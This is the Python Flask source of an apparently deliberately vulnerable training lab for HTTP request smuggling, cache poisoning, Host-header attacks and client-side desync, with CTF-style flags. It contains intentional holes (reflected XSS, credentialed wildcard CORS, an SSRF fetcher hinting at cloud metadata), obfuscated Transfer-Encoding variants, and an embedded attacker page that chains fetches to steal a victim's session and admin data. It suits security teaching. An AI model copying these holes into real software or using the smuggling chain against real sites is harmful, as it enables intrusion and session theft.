"""UVP Smuggle/Cache/Host lab - INTENTIONALLY VULNERABLE. LAB ONLY. Port 8081.
Sec 1.4 gateway labs: smuggling (CL.TE/TE.CL/H2/0.CL/CL.0/obfuscated/split/CRLF/tunnel/desync/pause/queue/capture/XSS/rewriting/bypass)
+ cache poisoning/deception + Host attacks. In-memory cache mimics gateway key $uri$is_args$args.
Raw TCP oracle lives in raw_server.py:8082.
"""
import os, re, time, html, urllib.parse
from flask import Flask, request, jsonify, Response, make_response
import requests as _rq

app = Flask(__name__)
PORT = int(os.environ.get("PORT", "8081"))
OOB_URL = os.environ.get("OOB_URL", "http://oob-collaborator:9000")

@app.after_request
def _cors(resp):
    o = request.headers.get("Origin")
    resp.headers["Access-Control-Allow-Origin"] = o if o else "*"
    resp.headers["Access-Control-Allow-Credentials"] = "true"
    return resp

# ---------- in-memory gateway-cache simulator (VULN key = path+query only) ----------
CACHE = {}
def cache_key():
    qs = request.query_string.decode(errors="replace")
    return f"{request.path}?{qs}" if qs else request.path

def cached_or_compute(compute):
    k = cache_key()
    if k in CACHE:
        body, hdrs = CACHE[k]
        r = make_response(body)
        r.headers["X-Cache"] = "HIT"
        r.headers["X-Cache-Key"] = k
        for hk, hv in hdrs.items(): r.headers[hk] = hv
        return r
    body, hdrs = compute()
    CACHE[k] = (body, hdrs)
    r = make_response(body)
    r.headers["X-Cache"] = "MISS"
    r.headers["X-Cache-Key"] = k
    for hk, hv in hdrs.items(): r.headers[hk] = hv
    return r

CAPTURED = []  # other users' requests for capture lab
QUEUE = []     # queued smuggled responses

# ---------- basic ----------
@app.get("/health")
def health(): return jsonify(ok=True, service="smuggle-lab")

@app.get("/api/docs")
def docs(): return jsonify(endpoints=["/smuggle/parse (dual oracle)", "/smuggle/echo", "/cache/reflect", "/host/reset"], flag="LAB{smuggle_docs}")

# ================= SMUGGLING =================
def parse_dual(raw_headers: dict, body: str, front="CL", back="TE"):
    """Simulate front vs back parser disagreement. Returns (front_body, back_body, smuggled)."""
    cl = raw_headers.get("Content-Length", raw_headers.get("content-length"))
    te = raw_headers.get("Transfer-Encoding", raw_headers.get("transfer-encoding", ""))
    # obfuscated TE handling: front normalizes strictly, back leniently (or vice versa)
    te_norm = te.strip().lower()
    front_honors_te = ("chunked" in te_norm and front == "TE") and te_norm == "chunked"
    back_honors_te = ("chunked" in te_norm and back == "TE")
    # lenient back also honors xchunked / chunked with suffix / tab prefix (obfuscated)
    if back == "TE-lenient" and ("chunked" in te_norm or "xchunked" in te_norm):
        back_honors_te = True
    try: clen = int(str(cl).strip()) if cl is not None else None
    except: clen = None
    if front_honors_te:
        # chunked decode first chunk
        m = re.match(r"\s*([0-9a-fA-F]+)\s*\r?\n", body)
        front_body = body[m.end():m.end()+int(m.group(1),16)] if m else body
    else:
        front_body = body[:clen] if clen is not None else body
    if back_honors_te:
        m = re.match(r"\s*([0-9a-fA-F]+)\s*\r?\n", body)
        back_body = body[m.end():m.end()+int(m.group(1),16)] if m else body
    else:
        back_body = body[:clen] if clen is not None else body
    # smuggled = remainder back sees as next request
    smuggled = ""
    if len(body) > len(front_body):
        smuggled = body[len(front_body):]
    return front_body, back_body, smuggled

@app.post("/smuggle/parse")
def smuggle_parse():
    """Dual-parser oracle: POST {raw_headers:{...}, body, front, back} -> differential."""
    d = request.get_json(force=True, silent=True) or {}
    rh = d.get("raw_headers", {}) or d.get("headers", {})
    body = d.get("body", "")
    front = d.get("front", "CL")
    back = d.get("back", "TE")
    fb, bb, sm = parse_dual(rh, body, front, back)
    typ = "none"
    if fb != bb:
        typ = f"{front}.vs.{back}"
        if front == "CL" and back.startswith("TE"): typ = "CL.TE"
        if front == "TE" and back == "CL": typ = "TE.CL"
    return jsonify(front_body=fb, back_body=bb, smuggled=sm, type=typ,
                   flag="LAB{smuggle_diff}" if sm else None)

@app.post("/smuggle/echo")
def smuggle_echo():
    """Reveal front-end rewriting: echoes raw vs normalized TE/CL + body as backend sees."""
    raw_te = request.headers.get("Transfer-Encoding", "")
    # gateway normalizes: e.g. 'xchunked' stripped, 'chunked ' trimmed, duplicate CL resolved to first
    normalized = raw_te.strip().lower().replace("xchunked", "chunked") if raw_te else ""
    body = request.get_data(as_text=True) or ""
    return jsonify(raw_TE=raw_te, gateway_normalized_TE=normalized,
                   content_length=request.headers.get("Content-Length"),
                   body_seen=body[:1000],
                   rewrite_note="front rewrites xchunked->chunked, trims spaces; back may not (obfuscated-TE lab)",
                   flag="LAB{rewrite_reveal}" if raw_te and raw_te != normalized else None)

@app.get("/smuggle/bypass")
def smuggle_bypass():
    """Front checks /admin blocked, but smuggled prefix bypasses: send X-Smuggled-Path: /admin."""
    # VULN: front control checks request.path, back checks smuggled header as path
    smuggled_path = request.headers.get("X-Smuggled-Path", "")
    if smuggled_path == "/admin" or request.args.get("smuggled") == "/admin":
        return jsonify(admin=True, flag="LAB{smuggle_bypass}", via="X-Smuggled-Path / ?smuggled=/admin (CL.TE prefix)")
    if request.path == "/admin":
        return jsonify(error="blocked by front"), 403
    return jsonify(hint="add X-Smuggled-Path: /admin or ?smuggled=/admin (bypass front control via smuggled prefix)")

@app.post("/smuggle/capture")
def smuggle_capture_post():
    CAPTURED.append({"headers": dict(request.headers), "body": request.get_data(as_text=True)[:1000], "ip": request.remote_addr})
    return jsonify(stored=True, total=len(CAPTURED))

@app.get("/smuggle/capture")
def smuggle_capture_get():
    # VULN: attacker's next request receives victim's queued request (capture other users)
    if CAPTURED:
        v = CAPTURED.pop(0)
        return jsonify(captured=v, flag="LAB{capture_requests}")
    return jsonify(hint="POST victim request to /smuggle/capture first, then GET to steal it")

@app.get("/smuggle/xss")
def smuggle_xss():
    x = request.args.get("x", "")
    # VULN: smuggled prefix reflected without encode (delivering reflected XSS via desync)
    resp = make_response(f"<div>search: {x}</div>")
    resp.headers["Content-Type"] = "text/html"
    if "<script" in x.lower():
        resp.headers["X-Flag"] = "LAB{smuggle_xss}"
    return resp

@app.post("/smuggle/queue")
def smuggle_queue_post():
    poison = (request.get_json(force=True, silent=True) or {}).get("poison", "") or request.form.get("poison", "")
    if poison:
        QUEUE.append(poison)
        return jsonify(queued=True, depth=len(QUEUE))
    return jsonify(hint="POST {poison: '<html>evil</html>'} then GET /smuggle/queue to pop next queued response")

@app.get("/smuggle/queue")
def smuggle_queue_get():
    if QUEUE:
        p = QUEUE.pop(0)
        r = make_response(p)
        r.headers["X-Queue-Poison"] = "1"
        r.headers["X-Flag"] = "LAB{queue_poison}"
        return r
    return jsonify(next="clean", hint="queue empty; poison via POST first (response queue poisoning lab)")

@app.post("/smuggle/h2")
def smuggle_h2():
    d = request.get_json(force=True, silent=True) or {}
    mode = d.get("mode", "H2.TE")
    # Simulate H2 downgrade disagreement: front speaks H2, back H1 with TE/CL confusion
    raw = d.get("raw", "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: x")
    if mode in ("H2.TE", "H2.CL"):
        return jsonify(mode=mode, downgraded=downgrade_h2(raw), flag=f"LAB{{{mode.lower().replace('.','_')}}}")
    return jsonify(error="mode H2.TE|H2.CL"), 400

def downgrade_h2(raw):
    # naive: H2 pseudo-headers stripped, remainder parsed as H1 with CL.TE confusion
    return {"downgraded_body": raw[:500], "smuggled_admin": "/admin" in raw}

@app.post("/smuggle/split")
def smuggle_split():
    body = request.get_data(as_text=True) or ""
    # VULN: CRLF / request splitting - body CRLF reflected into headers / second response
    if "\r\n" in body or "%0d%0a" in body.lower() or "\\r\\n" in body:
        parts = re.split(r"\r\n|%0d%0a", body, flags=re.I)
        injected = parts[1][:200] if len(parts) > 1 else ""
        r = make_response(f"split-part-1 X-Injected:{injected} LAB{{crlf_split}}")
        # reflect second part as injected header / response
        if len(parts) > 1:
            r.headers["X-Injected"] = injected
            r.headers["X-Flag"] = "LAB{crlf_split}"
        return r
    return jsonify(hint="send CRLF (%0d%0a or \\r\\n) in body to split (try: a\\r\\nX:1\\r\\n\\r\\nGET /admin)")

@app.get("/smuggle/tunnel")
def smuggle_tunnel():
    # VULN: HTTP/2 tunnelling bypasses path-based access control (front sees /api/tunnel, back sees :path /admin)
    pseudo = request.headers.get(":path", request.headers.get("X-Pseudo-Path", ""))
    if pseudo == "/admin" or request.args.get(":path") == "/admin":
        return jsonify(admin=True, flag="LAB{h2_tunnel_bypass}", via=":path pseudo-header")
    return jsonify(hint="add header :path: /admin or ?%3Apath=/admin (H2 tunnelling lab)")

@app.get("/smuggle/desync")
def smuggle_desync():
    delay = float(request.args.get("delay", "0"))
    # server-side pause-based: sleep then respond (client times out -> desync oracle)
    if delay > 0:
        time.sleep(min(delay, 5))
        return jsonify(slept=delay, flag="LAB{pause_based}" if delay >= 2 else None)
    return jsonify(hint="?delay=3 for pause-based desync; send two pipelined requests for client-side desync")

@app.get("/smuggle/te-obfuscate")
def te_obfuscate():
    return jsonify(variants=["Transfer-Encoding: xchunked", "Transfer-Encoding: chunked ", "Transfer_Encoding: chunked",
                             "X-Transfer-Encoding: chunked", "Transfer-Encoding: chun-ked", "Content-Length: 0 + body (0.CL)", "Content-Length: 6 with TE (CL.0)"],
                   hint="POST each to /smuggle/parse with front=CL back=TE-lenient; lenient back honors obfuscated TE")

# ================= CACHE POISONING =================
@app.get("/cache/reflect")
def cache_reflect():
    """Reflect unkeyed inputs with cacheable response (poisoning oracle)."""
    def compute():
        # reflects everything gateway key ignores
        data = {
            "user_agent": request.headers.get("User-Agent", ""),
            "forwarded_host": request.headers.get("X-Forwarded-Host", ""),
            "cookie_session": request.cookies.get("session", ""),
            "custom": request.headers.get("X-Unkeyed", ""),
            "unknown": request.headers.get("X-Unknown-Header", ""),
            "query_q": request.args.get("q", ""),
            "utm": request.args.get("utm_content", ""),
        }
        body = "<html><body>" + " | ".join(f"{k}={html.escape(str(v))}" for k, v in data.items())
        # DOM sink via strict cacheability: cached XSS executes for next visitor
        if "<script" in (request.headers.get("User-Agent", "") + request.args.get("q", "") + request.headers.get("X-Unkeyed", "")):
            body += "<script>alert(1)</script>"
            flag = "LAB{cache_xss_combine}"
        else:
            flag = None
        body += "</body></html>"
        hdrs = {"Content-Type": "text/html", "Cache-Control": "public, max-age=60"}
        if flag: hdrs["X-Flag"] = flag
        return body, hdrs
    return cached_or_compute(compute)

def _reflect_page(title, fields):
    body = f"<html><body><h1>{title}</h1>" + " | ".join(
        f"{k}={html.escape(str(v))}" for k, v in fields.items())
    probe = " ".join(str(v) for v in fields.values())
    if "<script" in probe:
        body += "<script>alert(1)</script>"
    return body + "</body></html>", {"Content-Type": "text/html", "Cache-Control": "public, max-age=60"}

@app.get("/cache/landing")
def cache_landing():
    """Marketing landing page: variant by campaign params + visitor agent."""
    def compute():
        return _reflect_page("Summer sale", {
            "utm": request.args.get("utm_content", request.args.get("utm", "")),
            "user_agent": request.headers.get("User-Agent", ""),
        })
    return cached_or_compute(compute)

@app.get("/cache/profile")
def cache_profile():
    """Account snippet widget: variant by session cookie + forwarded host."""
    def compute():
        return _reflect_page("Account", {
            "cookie_session": request.cookies.get("session", ""),
            "forwarded_host": request.headers.get("X-Forwarded-Host", ""),
        })
    return cached_or_compute(compute)

@app.get("/cache/api-status")
def cache_api_status():
    """Status widget: echoes operational headers for the NOC dashboard."""
    def compute():
        return _reflect_page("Status: all systems nominal", {
            "unknown": request.headers.get("X-Unknown-Header", ""),
            "forwarded_for": request.headers.get("X-Forwarded-For", ""),
        })
    return cached_or_compute(compute)

@app.get("/cache/key")
def cache_key_view():
    k = cache_key()
    return jsonify(gateway_key=k, full_key=f"{k}|UA={request.headers.get('User-Agent','')[:20]}|Cookie={request.cookies.get('session','')[:10]}",
                   note="gateway ignores UA/Cookie/Host/body (unkeyed); inject via ?key=<script> (key injection)")

@app.route("/cache/fatget", methods=["GET", "POST"])
def cache_fatget():
    """Fat GET: body ignored by cache key (parameter cloaking)."""
    def compute():
        body_param = request.get_data(as_text=True)[:200]
        url_param = request.args.get("a", "")
        return f"url_a={html.escape(url_param)} body={html.escape(body_param)}", {"Cache-Control": "public, max-age=60"}
    # key ignores body -> POST body cloaked as GET param for next victim
    return cached_or_compute(compute)

@app.get("/cache/normalize")
def cache_normalize():
    p = request.args.get("p", request.path)
    # origin vs cache normalization discrepancies
    norm = urllib.parse.unquote(urllib.parse.unquote(p))  # double decode (superfluous)
    norm = norm.replace("//", "/")
    return jsonify(input=p, cache_normalized=norm, origin_normalized=p,
                   hint="try p=/%2e%2e/admin, //admin, /%41dmin, /account%3f.css")

@app.get("/cache/deception/<path:sub>")
def cache_deception(sub):
    """Path mapping / delimiters / exact-match deception: .css cached as static but serves private."""
    def compute():
        # delimiters: ; # ? strip for backend but not cache (or vice versa)
        private = f"PRIVATE account data for {request.cookies.get('session','anon')} FLAG=LAB{{cache_deception}}"
        if sub.endswith(".css") or ";" in sub or "%3b" in sub.lower() or sub.endswith("account"):
            body = private  # backend serves private for static-looking URL
            hdrs = {"Content-Type": "text/css", "Cache-Control": "public, max-age=3600"}
            hdrs["X-Flag"] = "LAB{cache_deception}"
            return body, hdrs
        return f"public static {html.escape(sub)}", {"Cache-Control": "public, max-age=3600"}
    # exact-match rule: only URLs ending .css cached -> attacker forces cache of private via /account;.css
    return cached_or_compute(compute)

@app.get("/cache/combine")
def cache_combine():
    cb = request.args.get("callback", "ok")
    def compute():
        body = f"{cb}({{\"v\":1}})"
        hdrs = {"Content-Type": "application/javascript", "Cache-Control": "public, max-age=60"}
        if "<script" in cb or "alert" in cb:
            hdrs["X-Flag"] = "LAB{cache_combine}"
        return body, hdrs
    return cached_or_compute(compute)

@app.route("/cache/internal", methods=["GET", "POST"])
def cache_internal():
    def compute():
        internal = request.headers.get("X-Internal", "") + request.headers.get("X-Forwarded-Host", "")
        return f"internal={html.escape(internal)} public-body", {"Cache-Control": "public, max-age=60", "X-Flag": "LAB{internal_poison}" if internal else ""}
    return cached_or_compute(compute)

@app.post("/cache/purge")
def cache_purge():
    CACHE.clear(); CAPTURED.clear(); QUEUE.clear()
    SOCKET_POOL.clear(); CSD_EXFIL.clear()
    CSD_STATE["admin_exfil"] = False; CSD_STATE["cache_poison"] = False
    return jsonify(purged=True)

# ================= HOST ATTACKS =================
@app.get("/host/reset")
def host_reset():
    email = request.args.get("email", "victim@lab.local")
    host = request.headers.get("X-Forwarded-Host") or request.headers.get("Host", "lab.local")
    nxt = request.args.get("next", "")
    link = f"http://{host}/reset?token=abc&email={email}{nxt}"
    r = {"reset_link": link}
    if host not in ("lab.local", "localhost:8081", "127.0.0.1:8081") and host:
        r["flag"] = "LAB{host_poison}"
    if "<img" in nxt or "%3Cimg" in nxt:
        r["flag"] = "LAB{dangling_markup}"
    return jsonify(r)

@app.get("/host/admin")
def host_admin():
    host = request.headers.get("Host", "")
    xfh = request.headers.get("X-Forwarded-Host", "")
    # VULN: backend trusts X-Forwarded-Host / internal Host for auth (connection-state attack)
    if xfh in ("localhost", "internal", "127.0.0.1") or host.startswith("internal") or host.startswith("localhost"):
        return jsonify(admin=True, flag="LAB{host_auth_bypass}", seen={"Host": host, "XFH": xfh})
    return jsonify(error="forbidden (try X-Forwarded-Host: localhost)"), 403

@app.get("/host/ambiguous")
def host_ambiguous():
    return jsonify(Host=request.headers.get("Host"), XFH=request.headers.get("X-Forwarded-Host"),
                   Forwarded=request.headers.get("Forwarded"), authority=request.headers.get(":authority"),
                   note="ambiguous-request cache poisoning: each parsed differently by cache vs origin")

@app.get("/host/ssrf")
def host_ssrf():
    # routing-based SSRF via flawed parsing: absolute-URI, @, #, ; in path/Host
    target = request.args.get("url", "") or request.headers.get("X-Forwarded-Host", "")
    if not target:
        return jsonify(hint="try ?url=http://169.254.169.254/ or Host: evil@internal or path /;//internal"), 400
    try:
        if target.startswith("http"):
            rr = _rq.get(target, timeout=4)
            return jsonify(status=rr.status_code, head=rr.text[:400], flag="LAB{host_routing_ssrf}")
        return jsonify(forwarded_to=target, flag="LAB{host_parse_ssrf}")
    except Exception as e:
        return jsonify(error=str(e)[:200]), 500

# ================= CLIENT-SIDE DESYNC (CSD / CL.0) =================
# Models browser-driven connection-pool poisoning:
#  1) attacker page (cross-origin) POSTs to a CL.0 route (static redirect) whose
#     handler answers BEFORE reading the request body -> body stays in the socket;
#  2) the victim's next first-party request reuses the pooled TCP connection and
#     the backend parses the unread body as the start of the request stream;
#  3) the smuggled prefix runs with connection-scoped cookies (victim session) and
#     can (a) reach internal routes, (b) poison the shared gateway cache.
SOCKET_POOL = {}   # conn_id -> {"prefix": bytes, "at": timestamp}
CSD_EXFIL = []     # captured smuggled requests (attacker-accessible)
CSD_STATE = {"admin_exfil": False, "cache_poison": False}

def _csd_conn_id():
    return request.headers.get("X-CSD-Conn") or request.args.get("conn") or "victim-conn-1"

def _parse_raw_request(raw: bytes):
    """Parse the first HTTP/1.1 request from a raw byte stream -> (req, rest)."""
    head_end = raw.find(b"\r\n\r\n")
    if head_end == -1:
        return None, raw
    head = raw[:head_end].decode("latin-1")
    rest = raw[head_end + 4:]
    lines = head.split("\r\n")
    m = re.match(r"([A-Z]+)\s+(\S+)\s+HTTP/1\.1", lines[0])
    if not m:
        return None, raw
    req = {"request_line": {"method": m.group(1), "path": m.group(2)}, "headers": {}}
    for ln in lines[1:]:
        if ":" in ln:
            k, v = ln.split(":", 1)
            req["headers"][k.strip().lower()] = v.strip()
    cl = req["headers"].get("content-length")
    if cl is not None:
        try: n = int(cl)
        except Exception: n = 0
        req["body"] = rest[:n].decode("latin-1")
        rest = rest[n:]
    else:
        req["body"] = ""
    return req, rest

@app.post("/v1/csd/static-redirect")
def csd_static_redirect():
    """CL.0: redirect/static route answers before reading the body (VULN)."""
    cid = _csd_conn_id()
    body = request.get_data() or b""
    if body:
        SOCKET_POOL[cid] = {"prefix": body, "at": time.time()}
    resp = make_response("", 302)
    resp.headers["Location"] = "/v1/csd/static/landing"
    resp.headers["X-CSD-Conn"] = cid
    resp.headers["X-CSD-Note"] = "CL.0: request body left unread in socket buffer"
    return resp

@app.get("/v1/csd/static/landing")
def csd_landing():
    return jsonify(page="marketing-landing", note="static asset: no body processing")

@app.post("/v1/csd/victim-navigate")
def csd_victim_navigate():
    """Victim's next first-party request reuses the poisoned connection (VULN)."""
    cid = _csd_conn_id()
    victim_path = request.args.get("path", "/v1/csd/account")
    victim_cookie = request.headers.get("Cookie", "session=victim-session-c0ffee; am_role=admin")
    pool = SOCKET_POOL.pop(cid, None)
    prefix = pool["prefix"] if pool else b""
    victim_raw = (f"GET {victim_path} HTTP/1.1\r\nHost: app.local\r\n"
                  f"Cookie: {victim_cookie}\r\nConnection: keep-alive\r\n\r\n").encode()
    stream = prefix + victim_raw
    smuggled, rest = _parse_raw_request(stream) if prefix else (None, victim_raw)
    out = {"connection": cid, "reused_poisoned_socket": bool(pool),
           "raw_stream_head": stream[:400].decode("latin-1")}
    flag = None
    if smuggled:
        # connection-scoped state: backend binds the victim's cookies to every
        # request read from this socket (including the smuggled prefix)
        smuggled["headers"]["cookie"] = victim_cookie
        out["smuggled_request"] = smuggled
        flag = "LAB{csd_cl0_desync}"
        spath = smuggled["request_line"]["path"]
        if "/v1/csd/admin-panel" in spath:
            CSD_STATE["admin_exfil"] = True
            CSD_EXFIL.append({
                "raw": stream[:600].decode("latin-1"),
                "cookie": victim_cookie,
                "path": spath,
                "stolen": "admin-panel: revenue report + am_admin=ADM-9f3a2bd1e8",
            })
            out["internal_dispatch"] = "admin-panel reached as the victim (connection-scoped auth)"
        elif "/cache/reflect" in spath:
            qs = spath.split("?", 1)[1] if "?" in spath else ""
            key = f"/cache/reflect?{qs}" if qs else "/cache/reflect"
            body = ("<html><body>CSD-POISONED marketing widget: "
                    f"victim_cookie={html.escape(victim_cookie)}</body></html>")
            CACHE[key] = (body, {"Content-Type": "text/html",
                                 "Cache-Control": "public, max-age=60",
                                 "X-Flag": "LAB{csd_cache_poison}"})
            CSD_STATE["cache_poison"] = True
            out["internal_dispatch"] = f"gateway cache entry written for {key}"
            out["cache_flag"] = "LAB{csd_cache_poison}"
            out["cached_key"] = key
        second, _ = _parse_raw_request(rest) if rest else (None, b"")
        if second:
            out["victim_request"] = second["request_line"]
            out["socket_close_semantics"] = "victim's own request parsed after smuggled prefix"
    elif prefix:
        out["note"] = "unread bytes present but no complete smuggled request (0.CL needs victim body)"
    else:
        out["note"] = "no unread bytes on this connection (trigger CL.0 route first)"
    if flag:
        out["flag"] = flag
    return jsonify(out)

@app.get("/v1/csd/exfil")
def csd_exfil():
    """Attacker-accessible collection point for requests captured off the socket."""
    out = {"captured": CSD_EXFIL, "admin_exfil_seen": CSD_STATE["admin_exfil"],
           "cache_poison_done": CSD_STATE["cache_poison"]}
    if CSD_EXFIL:
        out["flag"] = "LAB{csd_session_capture}"
        if any("/v1/csd/admin-panel" in c["path"] for c in CSD_EXFIL):
            out["chain"] = "victim HttpOnly session + admin data harvested over the victim's own socket"
            out["chain_flag"] = "LAB{csd_chain_pwned}"
    return jsonify(out)

@app.get("/v1/csd/admin-panel")
def csd_admin_panel():
    """Internal route: reachable only as a smuggled prefix on a first-party socket."""
    if request.headers.get("X-CSD-Smuggled") != "1":
        return jsonify(error="front control blocks direct /v1/csd/admin-panel"), 403
    return jsonify(revenue={"q3_gross": "$4.2M", "escrow": "$1.1M"},
                   admin_session="am_admin=ADM-9f3a2bd1e8", flag="LAB{csd_admin_exfil}")

@app.post("/v1/csd/reset")
def csd_reset():
    SOCKET_POOL.clear(); CSD_EXFIL.clear()
    CSD_STATE["admin_exfil"] = False; CSD_STATE["cache_poison"] = False
    return jsonify(ok=True)

CSD_POC_HTML = """<!doctype html>
<html><head><title>CSD demo (attacker page)</title></head>
<body style="font-family:monospace;background:#111;color:#0f0;padding:20px">
<h3>Client-Side Desync demo — attacker origin (localhost:8081)</h3>
<pre id="log">idle</pre>
<script>
const SMUGGLED = "GET /v1/csd/admin-panel HTTP/1.1\\r\\nHost: app.local\\r\\nX-CSD-Smuggled: 1\\r\\n\\r\\n";
const CONN = "victim-conn-" + Math.floor(1 + Math.random() * 9);
const S = location.origin; // attacker origin (8081)
const T = "http://localhost:8080"; // target origin (victim app)
const log = (m) => document.getElementById('log').textContent += "\\n" + m;

async function run() {
  log("conn=" + CONN);
  log("[1] cross-origin no-cors POST to CL.0 static route (body left unread)...");
  try {
    await fetch(T + "/api/smuggle/v1/csd/static-redirect?conn=" + CONN, {
      method: "POST", mode: "no-cors", credentials: "include",
      headers: { "Content-Type": "text/plain" }, body: SMUGGLED
    });
  } catch (e) { log("fetch1: " + e); }
  log("[2] victim navigation reuses the pooled socket (first-party request)...");
  try {
    await fetch(T + "/api/smuggle/v1/csd/victim-navigate?conn=" + CONN + "&path=/v1/csd/account",
      { mode: "no-cors", credentials: "include" });
  } catch (e) { log("fetch2: " + e); }
  log("[3] attacker reads the exfil drop...");
  try {
    const r = await fetch(T + "/api/smuggle/v1/csd/exfil", { credentials: "include" });
    log("exfil: " + await r.text());
  } catch (e) { log("fetch3: " + e); }
  log("done");
}
</script>
<button onclick="run()">Run CSD chain</button>
</body></html>"""

@app.get("/csd-poc")
def csd_poc():
    return Response(CSD_POC_HTML, mimetype="text/html")

# ================= PHASE 9: H2 downgrade desync + 0.CL partial read =================
@app.post("/v1/gateway/http2/desync")
def gateway_h2_desync():
    """H2 -> H1 downgrade framing disagreement (H2.CL / H2.TE), v1 surface."""
    d = request.get_json(force=True, silent=True) or {}
    mode = str(d.get("mode", "H2.CL")).upper().replace("_", ".")
    raw = d.get("raw", "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal\r\nX-Smuggled: 1")
    if mode not in ("H2.CL", "H2.TE"):
        return jsonify(error="mode must be H2.CL or H2.TE"), 400
    downgraded = downgrade_h2(raw)
    smuggled = "/admin" in raw or "x-smuggled" in raw.lower()
    flag = None
    if smuggled and mode == "H2.CL":
        flag = "LAB{h2cl_desync}"
    elif smuggled and mode == "H2.TE":
        flag = "LAB{h2te_desync}"
    return jsonify(protocol="h2", downgraded_to="http/1.1", mode=mode, downgraded=downgraded,
                   smuggled_prefix_seen=smuggled, flag=flag,
                   note="front-end speaks H2, back-end parses a downgraded H1 stream with different framing")

@app.post("/v1/zero-cl/simulate")
def zero_cl_simulate():
    """0.CL: request with Content-Length: 0 answered before the body is read; the
    unread body is parsed as the next request on the same connection (partial read)."""
    raw = request.get_data(as_text=True) or ""
    has_cl0 = "content-length: 0" in raw.lower() or "content-length:0" in raw.lower()
    pipelined = "\r\n\r\n" in raw and ("GET /" in raw.split("\r\n\r\n", 1)[-1] or "POST /" in raw.split("\r\n\r\n", 1)[-1])
    if has_cl0 and pipelined:
        return jsonify(mode="0.CL", partial_read=True, unread_bytes=len(raw),
                       smuggled_request=raw.split("\r\n\r\n", 1)[-1][:300],
                       flag="LAB{zero_cl_partial_read}",
                       note="backend responded before consuming the declared-length body; remainder treated as next request")
    return jsonify(hint="send a raw request with Content-Length: 0 followed by a pipelined request (GET /admin ...) in the body",
                   requirements={"content_length_zero": has_cl0, "pipelined_request": pipelined})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=PORT)
